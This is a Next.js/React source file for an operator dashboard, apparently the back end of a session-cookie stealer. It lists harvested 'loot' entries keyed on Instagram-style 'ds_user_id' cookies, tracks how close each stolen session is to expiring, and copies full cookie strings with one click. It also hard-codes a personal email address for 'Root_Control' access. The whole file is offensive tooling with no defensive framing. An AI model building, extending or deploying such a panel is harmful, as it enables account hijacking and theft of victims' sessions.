"use client";
import { useEffect, useState, useCallback, useMemo } from "react";
import { createBrowserClient } from "@supabase/ssr";
import { motion, AnimatePresence } from "framer-motion";
import { CopyButton } from "@/components/CopyButton";
import { PurgeButton } from "@/components/PurgeButton";
import {
  LogOut,
  Activity,
  Database,
  ShieldAlert,
  Search,
  Fingerprint,
  Clock,
  AlertTriangle,
} from "lucide-react";
import { getRemoteLoot, logout, purgeRemoteLoot } from "./actions";
import Link from "next/link";

const getIdentityColor = (uid: string) => {
  const colors = [
    "text-blue-500 bg-blue-500/10 border-blue-500/20",
    "text-emerald-500 bg-emerald-500/10 border-emerald-500/20",
    "text-purple-500 bg-purple-500/10 border-purple-500/20",
    "text-amber-500 bg-amber-500/10 border-amber-500/20",
    "text-rose-500 bg-rose-500/10 border-rose-500/20",
  ];
  let hash = 0;
  for (let i = 0; i < uid.length; i++) {
    hash = uid.charCodeAt(i) + ((hash << 5) - hash);
  }
  return colors[Math.abs(hash) % colors.length];
};

export default function AdminDashboard() {
  const [loot, setLoot] = useState<any[]>([]);
  const [searchTerm, setSearchTerm] = useState("");
  const [profile, setProfile] = useState<{
    email: string;
    tenant_id: string;
  } | null>(null);

  const supabase = createBrowserClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
  );

  // Helper to calculate session health
  const getSessionHealth = useCallback((timestamp: string) => {
    const captureDate = new Date(timestamp).getTime();
    const now = new Date().getTime();
    const hoursOld = (now - captureDate) / (1000 * 60 * 60);

    if (hoursOld > 24)
      return { label: "EXPIRED", color: "text-zinc-800", alert: false };
    if (hoursOld > 20)
      return {
        label: "CRITICAL",
        color: "text-rose-600 animate-pulse",
        alert: true,
      };
    if (hoursOld > 12)
      return { label: "STALE", color: "text-amber-600", alert: false };
    return { label: "FRESH", color: "text-emerald-500", alert: false };
  }, []);

  // Stats calculation including expiring sessions
  const stats = useMemo(() => {
    const uniqueIds = new Set(
      loot
        .map(
          (item) =>
            item.data
              .find((s: string) => s.includes("ds_user_id"))
              ?.split("=")[1],
        )
        .filter(Boolean),
    );

    const expiring = loot.filter((item) => {
      const health = getSessionHealth(item.timestamp);
      return health.alert;
    }).length;

    return {
      total: loot.length,
      unique: uniqueIds.size,
      expiring,
    };
  }, [loot, getSessionHealth]);

  const fetchData = useCallback(async () => {
    try {
      const data = await getRemoteLoot();
      if (data && Array.isArray(data)) {
        setLoot([...data].reverse());
      }

      if (!profile) {
        const {
          data: { user },
        } = await supabase.auth.getUser();
        if (user) {
          const { data: profileData } = await supabase
            .from("profiles")
            .select("tenant_id, email")
            .single();
          setProfile({
            email: user.email || "",
            tenant_id: profileData?.tenant_id || "PENDING",
          });
        }
      }
    } catch (err) {
      console.error("Dashboard Sync Error:", err);
    }
  }, [profile, supabase]);

  const filteredLoot = useMemo(() => {
    return loot.filter((item) => {
      const searchStr = searchTerm.toLowerCase();
      const uid = item.data.find((s: string) => s.includes("ds_user_id")) || "";
      const username = item.username || "";
      return (
        uid.toLowerCase().includes(searchStr) ||
        username.toLowerCase().includes(searchStr)
      );
    });
  }, [loot, searchTerm]);

  const handlePurge = async () => {
    const result = await purgeRemoteLoot();
    if (result.success) setLoot([]);
  };

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 5000);
    return () => clearInterval(interval);
  }, [fetchData]);

  return (
    <div className="min-h-screen bg-[#050505] text-zinc-400 font-mono p-4 md:p-12">
      <header className="flex flex-col md:flex-row justify-between items-start md:items-center gap-6 mb-8 md:mb-12 max-w-6xl mx-auto">
        <div>
          <div className="flex items-center gap-4">
            <h1 className="text-white text-xl font-bold tracking-tighter uppercase italic">
              Procheckerly <span className="text-zinc-700">/ Node</span>
            </h1>
            <div className="flex flex-wrap gap-2">
              <div className="flex items-center gap-2 px-2 py-1 bg-emerald-500/10 border border-emerald-500/20 rounded text-[9px] text-emerald-500 font-bold uppercase">
                <Activity size={10} />
                {stats.total} Logs
              </div>
              <div className="flex items-center gap-2 px-2 py-1 bg-blue-500/10 border border-blue-500/20 rounded text-[9px] text-blue-500 font-bold uppercase">
                <Fingerprint size={10} />
                {stats.unique} Unique
              </div>
              {stats.expiring > 0 && (
                <div className="flex items-center gap-2 px-2 py-1 bg-rose-500/10 border border-rose-500/30 rounded text-[9px] text-rose-500 font-bold uppercase animate-pulse">
                  <AlertTriangle size={10} />
                  {stats.expiring} Expiring
                </div>
              )}
            </div>
          </div>
          <p className="text-[9px] uppercase tracking-[0.3em] text-blue-900 mt-2 font-bold">
            Target_ID: {profile?.tenant_id || "INITIALIZING..."}
          </p>
        </div>

        <div className="flex flex-wrap items-center gap-3 w-full md:w-auto">
          {profile?.email === "wchloe7964@gmail.com" && (
            <Link
              href="/admin/super"
              className="px-4 py-2 bg-blue-900/10 border border-blue-900/30 text-blue-500 rounded text-[10px] font-bold hover:bg-blue-900/20 transition-all uppercase flex items-center gap-2">
              <ShieldAlert size={12} /> Root_Control
            </Link>
          )}
          <PurgeButton onPurge={handlePurge} />
          <button
            onClick={() => logout()}
            className="flex-1 md:flex-none flex items-center justify-center gap-2 px-4 py-2 bg-zinc-900 hover:bg-red-950/20 text-zinc-600 hover:text-red-500 border border-zinc-800 rounded transition-all text-[10px] uppercase font-bold">
            <LogOut size={12} /> Logout
          </button>
        </div>
      </header>

      <main className="max-w-6xl mx-auto space-y-4">
        <div className="relative group">
          <Search
            className="absolute left-4 top-1/2 -translate-y-1/2 text-zinc-800 group-focus-within:text-blue-900 transition-colors"
            size={14}
          />
          <input
            type="text"
            placeholder="FILTER_SESSIONS_BY_ID_OR_USER..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-full bg-zinc-900/20 border border-zinc-900 p-3 pl-12 text-[10px] text-white focus:outline-none focus:border-blue-900 transition-all uppercase tracking-widest placeholder:text-zinc-800"
          />
        </div>

        <div className="rounded border border-zinc-900 bg-zinc-900/10 overflow-hidden overflow-x-auto">
          <table className="w-full text-left text-xs min-w-[700px]">
            <thead className="border-b border-zinc-900 bg-zinc-900/20 text-zinc-600 uppercase tracking-widest text-[9px]">
              <tr>
                <th className="px-6 py-4">Timestamp</th>
                <th className="px-6 py-4">Identity</th>
                <th className="px-6 py-4">Health_Status</th>
                <th className="px-6 py-4 text-right">Action</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-zinc-900/50">
              <AnimatePresence mode="popLayout">
                {filteredLoot.map((item, i) => {
                  const uid =
                    item.data
                      .find((s: string) => s.includes("ds_user_id"))
                      ?.split("=")[1] || "null";
                  const colorClass = getIdentityColor(uid);
                  const health = getSessionHealth(item.timestamp);

                  return (
                    <motion.tr
                      key={i}
                      layout
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      className={`group hover:bg-white/[0.01] transition-opacity ${health.label === "EXPIRED" ? "opacity-30" : "opacity-100"}`}>
                      <td className="px-6 py-5">
                        <div className="flex flex-col">
                          <span className="text-zinc-700 tabular-nums">
                            {item.timestamp}
                          </span>
                          {health.alert && (
                            <span className="text-[8px] text-rose-600 font-bold mt-1 uppercase italic tracking-tighter">
                              Recovery_Required
                            </span>
                          )}
                        </div>
                      </td>
                      <td className="px-6 py-5">
                        <span
                          className={`px-2 py-1 rounded border text-[10px] font-bold ${colorClass}`}>
                          {item.username ? `@${item.username}` : `ID:${uid}`}
                        </span>
                      </td>
                      <td className="px-6 py-5">
                        <div
                          className={`flex items-center gap-2 ${health.color}`}>
                          <span
                            className={`w-1 h-1 rounded-full bg-current ${health.label === "CRITICAL" ? "animate-ping" : ""}`}
                          />
                          <span className="text-[9px] uppercase font-bold italic tracking-widest">
                            {health.label}
                          </span>
                        </div>
                      </td>
                      <td className="px-6 py-5 text-right">
                        <CopyButton data={item.data.join("; ")} />
                      </td>
                    </motion.tr>
                  );
                })}
              </AnimatePresence>
            </tbody>
          </table>

          {(loot.length === 0 || filteredLoot.length === 0) && (
            <div className="py-24 flex flex-col items-center gap-4 text-zinc-800 text-[10px] uppercase tracking-[0.5em]">
              <Database size={20} className="opacity-10" />
              {loot.length === 0
                ? "Listening_for_stream..."
                : "No_Matching_Results"}
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
